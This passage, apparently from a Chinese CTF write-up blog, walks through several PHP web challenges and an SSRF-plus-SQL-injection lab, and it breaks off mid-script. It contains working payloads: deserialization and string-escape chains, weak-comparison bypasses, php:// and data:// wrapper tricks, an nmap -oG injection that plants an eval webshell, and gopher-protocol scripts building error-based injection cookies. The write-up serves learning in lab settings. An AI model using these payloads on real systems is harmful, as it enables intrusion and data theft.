&quot;&lt;br&gt;&quot;;echo $b;?&gt;    //输出exception &#x27;Exception&#x27; with message &#x27;payload&#x27; in D:\\labwork\\phpstudy_pro\\WWW\\test\\test.php:2 Stack trace: #0 &#123;main&#125;exception &#x27;Exception&#x27; with message &#x27;payload&#x27; in D:\\labwork\\phpstudy_pro\\WWW\\test\\test.php:2 Stack trace: #0 &#123;main&#125;\n当然Eorror类与其一样，不过前者只用于php7，后者5和7均可，我们可以知道这道题版本为7，因此只能用该类\n此时在注意preg_match函数多了一个math参数，这里将会把匹配到的内容分为数组穿进去，不过这里利用的点不是他\n​\t\t由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接 include “/flag” 将flag包含进来即可；由于过滤了引号，我们直接用url取反绕过\nURL编码取反绕过\n适用PHP版本：无限制当PHP&gt;=7时，可以直接利用取反构造payloadPS C:\\Users\\Administrator&gt; php -r &quot;var_dump(urlencode(~&#x27;phpinfo&#x27;));&quot;Command line code:1:string(21) &quot;%8F%97%8F%96%91%99%90&quot;//实际上(~%8F%97%8F%96%91%99%90)();#phpinfo();\n则poc如下\n//利用链如下&lt;?phpclass SYCLOVER &#123;    public $syc;    public $lover;    public function __wakeup()&#123;    &#125;&#125;$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;   //~urldecode=/flag$a=new Exception($str,1);$b=new Exception($str,2);$c = new SYCLOVER();$c-&gt;syc = $a;$c-&gt;lover = $b;echo(urlencode(serialize($c)));?&gt;//这里解释以下，为什么要闭合掉&quot;?&gt;&quot;，因为前面可能会有一些报错的信息，所以可以先闭合掉前面的东西，然后再来包含后面的是取反，因为在链里面所以需要用到解码，不用编码绕不过去正则，里面是/flag因为刷题多了都在根目录下面，不在的话正能一步步尝试。\n\n拿到flag\nweb2\n点进去看到源码，我一看审计有难度。。。\n &lt;?phprequire(&#x27;flag.php&#x27;);$function = @$_GET[&#x27;f&#x27;];    //get传参function filter($img)&#123;  //对变量进行检验,过滤特定关键词    $filter_arr = array(&#x27;jpg&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);      $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;    return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123;  //若session不存在,则销毁session    unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);   //变量覆盖,漏洞利用点if(!$function)&#123;    echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123;//这里又sha1加密,大概率不用了考虑了,这里利用不了    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123;    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));//对序列化的session变量过滤在赋值if($function == &#x27;highlight_file&#x27;)&#123;    highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; //这里没啥用    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123;//反序列化切入点    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode(base64_decode($userinfo[&#x27;img&#x27;])));&#125;  \n首先就是给f传参show_image以便进行反序列化,接着我们一步步测试一下\n方法一：反序列化字符串逃逸\n&lt;?phphighlight_file(__FILE__);function filter($img)&#123;  //对变量进行检验,过滤特定关键词    $filter_arr = array(&#x27;jpg&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);      $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;    return preg_replace($filter,&#x27;&#x27;,$img);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = &#x27;a&#x27;;$_SESSION[&#x27;img&#x27;] = &#x27;Wm14aFp5NXdhSEE9&#x27;;//flag.php base64编码两次//extract($_POST);   //变量覆盖,漏洞利用点echo &#x27;&lt;br&gt;&#x27;;var_dump(serialize($_SESSION));?&gt;\n\n结合filter函数的过滤，这里可以想到反序列化字符串逃逸，又因为代码中说，如果get参数img_path不存在，则会直接给img变量赋值，那我们想绕过只能靠逃逸。可以先构造如下：\n&lt;?phphighlight_file(__FILE__);function filter($img)&#123;  //对变量进行检验,过滤特定关键词    $filter_arr = array(&#x27;jpg&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);      $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;    return preg_replace($filter,&#x27;&#x27;,$img);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = &#x27;a&quot;;s:3:&quot;img&quot;;s:16:&quot;Wm14aFp5NXdhSEE9&quot;;&#125;&#x27;;$_SESSION[&#x27;img&#x27;] = &#x27;Wm14aFp5NXdhSEE9&#x27;;//flag.php base64编码两次//extract($_POST);   //变量覆盖,漏洞利用点echo &#x27;&lt;br&gt;&#x27;;var_dump(serialize($_SESSION));?&gt;\n\nstring(124) &quot;a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:38:&quot;a&quot;;s:3:&quot;img&quot;;s:16:&quot;Wm14aFp5NXdhSEE9&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:16:&quot;Wm14aFp5NXdhSEE9&quot;;&#125;&quot; //在这里我们就要利用function变量来构建img变量，于是我们要在user中添加flag或者其他关键词，以便其后被过滤为空的时候，可以吞进一部分function的内容。//再想一下，要吞到哪里，那很明显是&quot;#&quot;;s:8:&quot;function&quot;;s:38:&quot;a#&quot;，即#之间的内容，这样后面的img才会被当做新的session变量，那么我们看一下这一段字符串的数量：24，那我们可以给user赋值为6个flag即可，poc：$_SESSION[&quot;user&quot;] = &#x27;flagflagflagflagflagflag&#x27;;$_SESSION[&#x27;function&#x27;] = &#x27;a&quot;;s:3:&quot;img&quot;;s:16:&quot;Wm14aFp5NXdhSEE9&quot;;&#125;&#x27;;$_SESSION[&#x27;img&#x27;] = &#x27;Wm14aFp5NXdhSEE9&#x27;;//flag.php base64编码两次\nstring(144) &quot;a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:38:&quot;a&quot;;s:3:&quot;img&quot;;s:16:&quot;Wm14aFp5NXdhSEE9&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:16:&quot;Wm14aFp5NXdhSEE9&quot;;&#125;&quot; //过滤后string(120) &quot;a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:38:&quot;a&quot;;s:3:&quot;img&quot;;s:16:&quot;Wm14aFp5NXdhSEE9&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:16:&quot;Wm14aFp5NXdhSEE9&quot;;&#125;&quot; //可以发现s:24:&quot;后面要吞进去24个字符，直到&quot;a这里，然后后面的双引号闭合字符串，分号闭合该变量，于是s:3:&quot;img&quot;;s:16:&quot;Wm14aFp5NXdhSEE9&quot;;//就会单独当做img变量，poc如下：_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:16:&quot;Wm14aFp5NXdhSEE9&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;  //这里由于前面是3个属性,所以要加一个.\n\n继续编码访问即可\n_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:16:&quot;Wm14aFlXRmhZV0Zu&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125; \n\n拿到flag，这里说明一下为何传参为_SESSION而不是$_SSEION，这是因为代码中的extract函数，会将传入的post内容进行变量覆盖，而_SESSION这里要当做变量名，故此在后续中会被当做键值然后在作为变量名，也就是自动添加$。\n方法二：变量覆盖\n这个其实跟方法一差不多，只不过我认为有点烧脑，但也更加简便\n我们已经知道我们要传的是：\n_SESSION[img]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;\n但由于有一个自动给img变量赋值的语句： $_SESSION['img'] = base64_encode('guest_img.png');\n因此我们需要利用filter函数，假如我们传入：\n_SESSION[imgphp]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;\n那么php被过滤，但此变量依旧存在也就是：_SESSION[img]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;\n不会和环境自带的img变量冲突，输入如下\n&quot;a:1:&#123;s:7:&quot;img&quot;;s:36:&quot;;s:3:&quot;img&quot;;s:20:&quot;Wm14aFp5NXdhSEE9&quot;;&#125;&quot;;&#125;&quot; //由此我们又想到字符串逃逸，我们想法读到s:36:即可，一共10个，那么构造如下&quot;a:1:&#123;s:10:&quot;img&quot;;s:36:&quot;;s:3:&quot;img&quot;;s:20:&quot;Wm14aFp5NXdhSEE9&quot;;&#125;&quot;;&#125;&quot;//分号闭合结尾，而环境自带的img变量便读不进去而没用了//poc；$_SESSION[imgflag]=;s:3:&quot;123&quot;;s:3:&quot;img&quot;;s:16:&quot;$_SESSION[imgphpflag]=;s:3:&quot;123&quot;;s:3:&quot;img&quot;;s:16:&quot;Wm14aFp5NXdhSEE9&quot;;&#125;&quot;;&#125;  //但要注意有三个元素,因此这里还要在添加一个,但要添加在前面//输出&quot;a:1:&#123;s:7:&quot;img&quot;;s:50:&quot;;s:3:&quot;123&quot;;s:3:&quot;img&quot;;s:16:&quot;Wm14aFp5NXdhSEE9&quot;;&#125;&quot;;&#125;&quot; //为了读取到:我们要再添加三个字符,让s:7变成s:10,//最终payload$_SESSION[imgjpgflag]=;s:3:&quot;123&quot;;s:3:&quot;img&quot;;s:16:&quot;Wm14aFp5NXdhSEE9&quot;;&#125;\n文章参考：\n参考一\n参考二\nweb3\n\n没信息，点击开始看看\n\n看源代码\n\nbase64解码看看\n\n那就访问一下110.php，有点复杂的代码审计，不慌\n&lt;?phpinclude &#x27;fl0g.php&#x27;;highlight_file(__FILE__);if(isset($_GET[&#x27;mo&#x27;])&amp;&amp;isset($_GET[&#x27;fish&#x27;])) &#123;    $mo=$_GET[&#x27;mo&#x27;];    $fish=$_GET[&#x27;fish&#x27;];    $logined=false;    $keys=true;    if (!ctype_alpha($mo))&#123;$keys=false;&#125;    if (!is_numeric($fish) )&#123;$keys=false;&#125;    if (md5($mo) == md5($fish))&#123;    echo&quot;Let&#x27;s start fishing !&quot;;    $b = $_GET[&#x27;b&#x27;];     &#123;        if(&#x27;f1a9&#x27; === substr(md5($b),-4,4))        &#123;            $password=&quot;doyoulikemoyu?&quot;;            if(isset($_POST[&#x27;password&#x27;]))            &#123;                if(strcmp($_POST[&#x27;password&#x27;],$password) == 0)                &#123;                    if (isset($_POST[&#x27;message&#x27;])) &#123;                        $message = json_decode($_POST[&#x27;message&#x27;]);                        $key =&quot;*********&quot;;                        if($message-&gt;key == $key)                        &#123;                            $logined=true;                        &#125;                    &#125;                &#125;                else                &#123;                    echo&quot;That&#x27;s a little bit !&quot;;                &#125;            &#125;            else            &#123;                echo&quot;you don&#x27;t like mo yu ???&quot;;            &#125;        &#125;        else        &#123;            die(&quot;You are not far from success !&quot;);        &#125;    &#125;&#125; else&#123;    echo&quot;good see you next !&quot;;&#125;&#125;       else&#123;echo&quot;Think again !&quot;;&#125;if($logined&amp;&amp;$keys)&#123;    echo &#x27;Congratulations on your successful fishing !&#x27;;    highlight_file(&#x27;fl0g.php&#x27;);    die(&#x27;By Wang&#x27;);&#125;?&gt; Think again !\n绕过一：\n\n这里要求输入的内容为字符串\n\n这里则是检测是否为数字，接着配合md5弱比较，但这里不能用数组，因为前面的if会影响变量的布尔值。因此只需要其md5值是以0e开头即可\n只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，因为不管0不论和多少相乘都是0。\n一些例子：1.QNKCDZO0e8304004519934940580242199033912.s878926199a0e5459932745177090343288558410203.s155964671a0e3427684168224515249741172544694.s214587387a0e8482404488305379244658656119045.s214587387a0e8482404488305379244658656119046.s878926199a0e5459932745177090343288558410207.s1091221200a0e9406242178565615578163273846758.s1885207154a0e5093672134182067008420087635149.2406107080e462097431906509019562988736854\n于是这里传参为：?mo=QNKCDZO&amp;fish=240610708\n绕过二:\n\n第一处要求传入的参数经过md5加密后的后四位与指定的字符串相同，无法，只得上脚本。\nimport hashlibfor i in range(100000):    m = hashlib.md5()    m.update(str(i).encode())    h = m.hexdigest()    if h[-4:] == &quot;f1a9&quot;:        print(i)        break\n\n成功！\n绕过三：\n$password=&quot;doyoulikemoyu?&quot;;            if(isset($_POST[&#x27;password&#x27;]))            &#123;                if(strcmp($_POST[&#x27;password&#x27;],$password) == 0)\n这里我不理解这个password的设定，感觉有问题，不过考察点可以知道就是绕过strcmp，考虑其特性\nstrcmp是比较两个字符串，如果两者相等 返回0题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，那我们传入 password[]=xxx 可以绕过 这是因为函数接受到了不符合的类型，将发生错误，返回null，因此与0比较会判断相等\n$message = json_decode($_POST[&#x27;message&#x27;]);                        $key =&quot;*********&quot;;                        if($message-&gt;key == $key)                        &#123;                            $logined=true;                        &#125;\n绕过四：\n这里的key变量就正常了，显然考察的有时json解码\n\n输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0==&quot;admin&quot;这种形式绕过因为说到底这就是个弱比较类型，0与字符串比较都是返回true\n故payload如下\nget：?mo=QNKCDZO&amp;fish=240610708&amp;b=12400post：password[]=1&amp;message=&#123;&quot;key&quot;:0&#125;\n\n拿到flag\nweb4\n开始审计\n &lt;?php  $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;flag is here&quot;))&#123;    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        echo &quot;Not now!&quot;;        exit();     &#125;else&#123;        include($file);  //here.php        $password = unserialize($password);        echo $password;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt; \n这里传入text参数，并且其中的内容要完全等于&quot;flag is here&quot;，这时候就想到input或者data伪协议\n使用php://input伪协议绕过\t将要GET的参数?xxx=php://input\t用post方法传入想要file_get_contents()函数返回的值\t\t原因：php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行，当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容，从而导致任意代码执行。用data://伪协议绕过\t将url改为：?xxx=data://text/plain;base64,想要file_get_contents()函数返回的值的base64编码\t或者将url改为：?xxx=data:text/plain,(url编码的内容)\n我们有看到here.php文件包含，在这之前我们需要先使用filter协议读取里面的源码。\npayload如下：?text=data://text/plain;base64,ZmxhZyBpcyBoZXJl&amp;file=&amp;file=php://filter/convert.base64-encode/resource=here.php\n&lt;?php  class Flag&#123;  //flag.php      public $file;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;OMO SO CLOSE !///COME ON&quot;);        &#125;      &#125;  &#125;  ?&gt;    //poc如下：&lt;?php  class Flag&#123;  //flag.php      public $file;      public function __tostring()&#123;  &#125;  $poc=new Flag();$poc-&gt;file=&quot;flag.php&quot;;echo serialize($poc);?&gt;  //这里序列化后的字符串被赋值为password，然后再页面有echo $password的语句，故此调用tostring方法，成功读到flag\npayload如下：?text=data://text/plain;base64,ZmxhZyBpcyBoZXJl&amp;file=&amp;file=here.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; \n\nweb5\n &lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;//判断是否存在xff头    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;//若存在，则将客户端 IP 地址设置为 HTTP_X_FORWARDED_FOR 的值if(!isset($_GET[&#x27;host&#x27;])) &#123;    highlight_file(__FILE__);&#125; else &#123;    $host = $_GET[&#x27;host&#x27;];    $host = escapeshellarg($host);//把字符串转码为可以在 shell 命令里使用的参数    $host = escapeshellcmd($host);// shell 元字符转义    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);    //代码生成一个名为 $sandbox 的目录名，该目录名是基于 &quot;glzjin&quot; 和客户端 IP 地址的 MD5 散列值。    echo &#x27;you are in sandbox &#x27;.$sandbox;    @mkdir($sandbox);//在当前工作目录下创建了这个目录，并将工作目录切换到该目录中。    chdir($sandbox);    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);    //执行了一个 nmap 命令来扫描用户提供的主机，扫描结果会被输出显示。&#125;\n审了半天不清楚利用点。。。。借助wp吧，太菜了\nescapeshellarg()函数：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)escapeshellcmd()函数：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。反斜线（\\）会在以下字符之前插入： &amp;#;`|?~&lt;&gt;^()[]&#123;&#125;$, \\x0A 和 \\xFF。 *’ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。\n上述太抽象，测试一番\n&lt;?php$a=1;echo $a;echo &#x27;&lt;br&gt;&#x27;;$a=escapeshellarg($a);echo $a;echo &#x27;&lt;br&gt;&#x27;;$a=escapeshellcmd($a);echo $a;?&gt;\n\nescapeshellarg()函数将整个字符串加了单引号包裹，并且对单引号进行了转义，转义的单引号也使用了单引号包裹起来，然后用escapeshellcmd()函数进行了转义，成对出现的单引号不转义，对\\进行了转义，对最后一个单引号（单个出现）进行了转义\n在看\n传入的参数是：172.17.0.2’ -v -d a=1经过escapeshellarg处理后变成了’172.17.0.2’‘’ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。经过escapeshellcmd处理后变成’172.17.0.2’\\‘’ -v -d a=1’，这是因为escapeshellcmd对\\以及最后那个不配对儿的引号进行了转义：最后执行的命令是curl ‘172.17.0.2’\\‘’ -v -d a=1’，由于中间的\\被解释为\\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\\ -v -d a=1’，即向172.17.0.2\\发起请求，POST 数据为a=1’。\n对ip进行加密，然后创建目录，输出system执行nmap命令后的结果，比如传入127.0.0.1，返回：\n\n框起来的字符就是创建的目录路径\n通过查资料得知nmap 中的-oG参数可以将命令和结果写入文件\n一般flag都在根目录下，直接使用反引号进行命令执行\n构造payload：\n?host=&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;//如此写是为了防止那两个函数的转义,详解如下\n访问该目录下的test.php即可\n\n\n贴一下大佬的试错：\n关于加不加最后的单引号或加不加 单引号前的空格做了结果展示\n\n首先是后面没有加引号\n\n?host=‘ &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php我们可以在线测试一下\n\n‘‘\\‘‘ &lt;?php phpinfo();?&gt; -oG test.php\\‘返回结果是上面那样文件名后面会多一个引号\n\n然后是加引号但引号前没有空格\n\n?host=‘ &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php‘ 1\n\n运行结果如下\n\n‘‘\\‘‘ &lt;?php phpinfo();?&gt; -oG test.php‘\\‘‘‘文件名后面就会多出\\\n\n所以要注意细节\n\n不过这个代码似乎没啥用\nif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;//判断是否存在xff头    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];\n参考文章：\nwp参考\nweb6\n简单的php反序列化\nindex.php\n&lt;?php# @dance.phperror_reporting(0);class message&#123;    public $cai;    public $xv;    public $kun;    public $token=&#x27;lanqiu&#x27;;    public function __construct($c,$x,$k)&#123;        $this-&gt;cai = $c;        $this-&gt;xv = $x;        $this-&gt;kun = $k;    &#125;&#125;$c = $_GET[&#x27;c&#x27;];$x = $_GET[&#x27;x&#x27;];$k = $_GET[&#x27;k&#x27;];if(isset($c) &amp;&amp; isset($x) &amp;&amp; isset($k))&#123;    $msg = new message($c,$x,$k);//该类在dance.php中    $umsg = str_replace(&#x27;okok&#x27;, &#x27;nonoo&#x27;, serialize($msg));//估计就是字符串逃逸了    setcookie(&#x27;msg&#x27;,base64_encode($umsg));    echo &#x27;Your message has been sent&#x27;;&#125;highlight_file(__FILE__);\ndance.php\n&lt;?phpinclude &#x27;flag.php&#x27;;highlight_file(__FILE__);class message&#123;    public $cai;    public $xv;    public $kun;    public $token=&#x27;lanqiu&#x27;;    public function __construct($c,$x,$k)&#123;        $this-&gt;cai = $c;        $this-&gt;xv = $x;        $this-&gt;kun = $k;    &#125;&#125;if(isset($_COOKIE[&#x27;msg&#x27;]))&#123;    $msg = unserialize(base64_decode($_COOKIE[&#x27;msg&#x27;]));    if($msg-&gt;token==&#x27;sings&#x27;)&#123; //令token=sings即可得到flag        highlight_file(&#x27;flag.php&#x27;);    &#125;&#125; //$umsg = str_replace(&#x27;okok&#x27;, &#x27;nonoo&#x27;, serialize($msg));//估计就是字符串逃逸了\n这个文件就是关键了，开始测试\ntoken我们不能直接传参，可以通过字符逃逸来完成。这里每一个okok字符串就会多一个字符。\n用双引号将其闭合，所以我们可以在$kun赋值为&quot;;s:5:“token”;s:5:“sings”;}，这些就是我们要逃逸的字符，有27个，那么我们就加上27个okok字符串。payload为\n?c=1&amp;x=1&amp;k=okokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokokok&quot;;s:5:&quot;token&quot;;s:5:&quot;sings&quot;;&#125;\nweb7\n\n又是原p！！！，查看源代码也没啥信息，尝试扫目录\n\n访问看看\n\n没权限\n\n有点懵，给了个序列化字符串，不知道啥意思，那就抓包看有啥惊喜\n\n有点可疑，与序列化字符串相对应，尝试更换一下\n\n得到base64，接下来反转一下解码即可\n\n","categories":["内部竞赛"]},{"title":"攻防世界-very_easy_sql","url":"/2023/08/21/very_easy_sql/","content":"题目描述：\n太简单了不描述了，给sql签个到吧\n题目解题：\n\n打开页面，这里说我们不是内部用户不能访问，那估计得利用ssrf，这里先测试一下表单。先尝试了弱口令，没用，在尝试万能密码：'or 1=1#，也没信息，那看一下源代码\n\n发现php，访问一下\n\n不出所料这里就是ssrf利用点。这里也是测试一番，发现只有输入127.0.0.1有反应\n\nbp抓包看一下似乎也没啥信息，这里也就没思路，因为ssrf的利用不太会，因此就借鉴wp吧。\n看了wp这里是要利用协议来实现内部访问\nGopher协议\n​\t\t定义：Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；\ngopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议\n\n限制：gopher协议在各个编程语言中的使用限制Gopher协议格式：\nURL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流\n\ngopher的默认端口是70\n如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码\n\n剩下的细节就参考：gopher协议基础\ngopher实战1：gopher协议的利用 - FreeBuf网络安全行业门户\ngopher实战2：Gopher协议在SSRF漏洞中的深入研究（附视频讲解） - 知乎 (zhihu.com)\nssrf参考：SSRF漏洞 - Saint_Michael - 博客园 (cnblogs.com)\nSSRF深入各种高级实战用法_G0mini的博客-CSDN博客\nssrf漏洞利用(内网探测、打redis) - ctrl_TT豆 - 博客园 (cnblogs.com)\n粮食充足~\n抓包首页post表单发现响应包有set-cookie，wp说：有一个Set-Cookie代表如果输入正确的账号跟密码是可以返回的，可以尝试爆破\n\n思来想去，这里应该就是结合ssrf来登录实现内部访问获取cookie\n那这里就需要万能的gopher协议了，不过自身太菜，只能作为一个脚本小子了，虽不会写但咱也得看懂\nimport urllib.parse #导入库 urllib.parse，用于URL解析与转码content = &quot;uname=admin&amp;passwd=admin&quot; content_length = len(content)   # 构造请求体内容test =\\           &quot;&quot;&quot;POST /index.php HTTP/1.1Host: 127.0.0.1:80User-Agent: curl/7.43.0Accept: */*Content-Type: application/x-www-form-urlencodedContent-Length: &#123;&#125;uname=admin&amp;passwd=admin\t# 这里似乎不用再次写&quot;&quot;&quot;.format(content_length)\t\t# 构造http请求tmp = urllib.parse.quote(test)          # 进行URL编码     new = tmp.replace(&quot;%0A&quot;, &quot;%0D%0A&quot;)      # 将%0A替换为%0D%0A    把\\n换行符替换为\\r\\nresult = urllib.parse.quote(new)        # 再次进行URL编码print(&quot;gopher://127.0.0.1:80/_&quot;+result) # 输出结果\n输出如下gopher://127.0.0.1:80/_POST%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl/7.43.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252024%250D%250A%250D%250Auname%253Dadmin%2526passwd%253Dadmin%2509%2523%2520%25E8%25BF%2599%25E9%2587%258C%25E4%25BC%25BC%25E4%25B9%258E%25E4%25B8%258D%25E7%2594%25A8%25E5%2586%258D%25E6%25AC%25A1%25E5%2586%2599%250D%250A\n\n这里抓包看回显，有两个cookie，那估计是我们在use页面直接访问127.0.0.1时，其cookie被上面的cookie覆盖了。那这里第二个cookie就是我们登录时得到cookie，那很明显这个cookie就是注入点。\n\n报错注入\n这里解码发现为admin，那现在就是测试闭合方式了，先测试admin’ #\nimport urllib.parsehost = &quot;127.0.0.1:80&quot;cookie=&quot;this_is_your_cookie=YWRtaW4nICM=&quot;test =\\&quot;&quot;&quot;GET /index.php HTTP/1.1Host: &#123;&#125;Connection: closeContent-Type: application/x-www-form-urlencodedCookie:&#123;&#125;&quot;&quot;&quot;.format(host,cookie)tmp = urllib.parse.quote(test)new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)result = urllib.parse.quote(new)print(&quot;gopher://&quot;+host+&quot;/_&quot;+result)\n输出:gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nICM%253D%250D%250A%250D%250A\n\n发现页面有报错信息，那我们就开始报错注入吧，这里看到near ‘’，那应该就是admin’)闭合的方式，我们直接测试看看\npayload为：admin') and extractvalue(1, concat(0x7e, (select database()),0x7e)) #\nimport urllib.parseimport base64host = &quot;127.0.0.1:80&quot;payload = &quot;admin&#x27;) and extractvalue(1, concat(0x7e,(select database()),0x7e)) #&quot;base64_payload = str(base64.b64encode(payload.encode(&quot;utf-8&quot;)), &quot;utf-8&quot;)cookie=&quot;this_is_your_cookie=&quot;+base64_payloadtest =\\&quot;&quot;&quot;GET /index.php HTTP/1.1Host: &#123;&#125;Connection: closeContent-Type: application/x-www-form-urlencodedCookie:&#123;&#125;&quot;&quot;&quot;.format(host,cookie)tmp = urllib.parse.quote(test)new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)result = urllib.parse.quote(new)print(&quot;gopher://&quot;+host+&quot;/_&quot;+result)\n输出：gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSkpICM%253D%250D%250A%250D%250A\n\n查表：\nadmin&#x27;) and extractvalue(1, concat(0x7e, (select GROUP_CONCAT(table_name)from information_schema.tables WHERE table_schema=&#x27;security&#x27;),0x7e)) #\nimport urllib.parseimport base64host = &quot;127.0.0.1:80&quot;payload = &quot;admin&#x27;) and extractvalue(1, concat(0x7e, (select GROUP_CONCAT(table_name)from information_schema.tables WHERE table_schema=&#x27;security&#x27;),0x7e)) #&quot;base64_payload = str(base64.b64encode(payload.encode(&quot;utf-8&quot;)), &quot;utf-8&quot;)cookie=&quot;this_is_your_cookie=&quot;+base64_payloadtest =\\&quot;&quot;&quot;GET /index.php HTTP/1.1Host: 